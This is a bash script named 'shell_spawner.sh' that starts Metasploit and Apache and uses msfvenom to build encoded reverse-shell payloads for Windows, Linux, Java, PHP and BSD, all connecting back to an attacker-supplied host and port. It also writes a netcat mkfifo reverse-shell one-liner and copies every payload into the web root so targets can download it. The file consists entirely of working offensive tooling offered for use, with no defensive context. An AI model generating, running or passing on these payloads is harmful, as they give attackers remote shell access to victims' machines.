#!/usr/bin/env bash

LHOST="$1"
LPORT="$2"
WD="$3"
PROJECT="$4"

if [ -z "$*" ];
    then
        echo "Syntax: shell_spawner.sh LHOST LPORT WorkingDirectory ProjectName"
        exit 1
fi

#Initialize MSF in case of dependencies
service postgresql restart
msfdb start
service apache2 restart

cd $WD
mkdir $WD/shells >/dev/null 2>&1

echo -e "\e[1;31m--------------------------------------------------\e[00m"
echo -e "Shell spawner, reverse shells to IP \e[1;33m"$LHOST"\e[00m port \e[1;33m"$LPORT"\e[00m"
echo -e "Outputting to folder: ""$WD""/shells"
echo -e "As well as to webfolder: /var/www/html/""$PROJECT"
echo -e "\e[1;31m--------------------------------------------------\e[00m"

## WINDOWS ##

echo -e "\e[1;33mSpawning Windows shells: \e[00m"

SHELLSTEP="win$LPORT.exe"
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -e x86/shikata_ga_nai -b "\x00\x0a\x0d" -f exe -o $WD/shells/$SHELLSTEP \
>error_stat.txt 2>&1
if grep -q Error error_stat.txt;
    then
        echo -e "\e[1;31m"$SHELLSTEP" failed.\e[00m"
        cat error_stat.txt
    else
        echo "$SHELLSTEP"" succeeded."
fi

SHELLSTEP="winbinaryshell$LPORT.txt"
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT EXITFUNC=thread -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x20" -f c -o $WD/shells/$SHELLSTEP \
>error_stat.txt 2>&1
if grep -q Error error_stat.txt;
    then
        echo -e "\e[1;31m"$SHELLSTEP" failed.\e[00m"
        cat error_stat.txt
    else
        echo "$SHELLSTEP"" succeeded."
fi

SHELLSTEP="asp$LPORT.asp"
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -e x86/shikata_ga_nai -b "\x00\x0a" -f asp -o $WD/shells/$SHELLSTEP \
>error_stat.txt 2>&1
if grep -q Error error_stat.txt;
    then
        echo -e "\e[1;31m"$SHELLSTEP" failed.\e[00m"
        cat error_stat.txt
    else
        echo "$SHELLSTEP"" succeeded."
fi


## LINUX ##

echo -e "\e[1;33mSpawning Linux shells: \e[00m"

SHELLSTEP="linuxbinaryshell$LPORT.txt"
msfvenom -a x86 --platform linux -p linux/x86/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT b "\x00\x60\x29\x27" -e x86/shikata_ga_nai -f c -o $WD/shells/$SHELLSTEP \
>error_stat.txt 2>&1
if grep -q Error error_stat.txt;
    then
        echo -e "\e[1;31m"$SHELLSTEP" failed.\e[00m"
        cat error_stat.txt
    else
        echo "$SHELLSTEP"" succeeded."
fi

SHELLSTEP="linux$LPORT.elf"
msfvenom -a x86 --platform linux -p linux/x86/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o $WD/shells/$SHELLSTEP \
>error_stat.txt 2>&1
if grep -q Error error_stat.txt;
    then
        echo -e "\e[1;31m"$SHELLSTEP" failed.\e[00m"
        cat error_stat.txt
    else
        echo "$SHELLSTEP"" succeeded."
fi

## JAVA ##

echo -e "\e[1;33mSpawning Java shells: \e[00m"
SHELLSTEP="java$LPORT.jsp"
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f raw -o $WD/shells/$SHELLSTEP \
>error_stat.txt 2>&1
if grep -q Error error_stat.txt;
    then
        echo -e "\e[1;31m"$SHELLSTEP" failed.\e[00m"
        cat error_stat.txt
    else
        echo "$SHELLSTEP"" succeeded."
fi

SHELLSTEP="java$LPORT.war"
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f war -o $WD/shells/$SHELLSTEP \
>error_stat.txt 2>&1
if grep -q Error error_stat.txt;
    then
        echo -e "\e[1;31m"$SHELLSTEP" failed.\e[00m"
        cat error_stat.txt
    else
        echo "$SHELLSTEP"" succeeded."
fi


## PHP ##

echo -e "\e[1;33mSpawning PHP shells: \e[00m"

SHELLSTEP="phpmsf$LPORT.php"
msfvenom -a php --platform PHP -p php/reverse_php LHOST=$LHOST LPORT=$LPORT -f raw -o $WD/shells/$SHELLSTEP \
>error_stat.txt 2>&1
if grep -q Error error_stat.txt;
    then
        echo -e "\e[1;31m"$SHELLSTEP" failed.\e[00m"
        cat error_stat.txt
    else
        echo "$SHELLSTEP"" succeeded."
fi

## BSD ##
echo -e "\e[1;33mSpawning BSD shells: \e[00m"

SHELLSTEP="bsd$LPORT"
msfvenom -a x86 --platform bsd -p bsd/x86/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -e x86/shikata_ga_nai -b "\x00" -f raw -o $WD/shells/$SHELLSTEP \
>error_stat.txt 2>&1
if grep -q Error error_stat.txt;
    then
        echo -e "\e[1;31m"$SHELLSTEP" failed.\e[00m"
        cat error_stat.txt
    else
        echo "$SHELLSTEP"" succeeded."
fi

SHELLSTEP="bsd$LPORT.bin"
msfvenom -a x86 --platform bsd -p bsd/x86/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -e x86/shikata_ga_nai -b "\x00" -f elf -o $WD/shells/$SHELLSTEP \
>error_stat.txt 2>&1
if grep -q Error error_stat.txt;
    then
        echo -e "\e[1;31m"$SHELLSTEP" failed.\e[00m"
        cat error_stat.txt
    else
        echo "$SHELLSTEP"" succeeded."
fi

SHELLSTEP="bsdsimple$LPORT.sh"
echo "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i | nc ""$LHOST"" ""$LPORT"" >/tmp/f" >$WD/shells/$SHELLSTEP
echo "$SHELLSTEP"" succeeded."

#Make executable
chmod +x $WD/shells/*

#Copy to webhost
mkdir /var/www/html/$PROJECT
cp $WD/shells/* /var/www/html/$PROJECT

echo -e "\e[1;33mComplete\e[00m"
exit
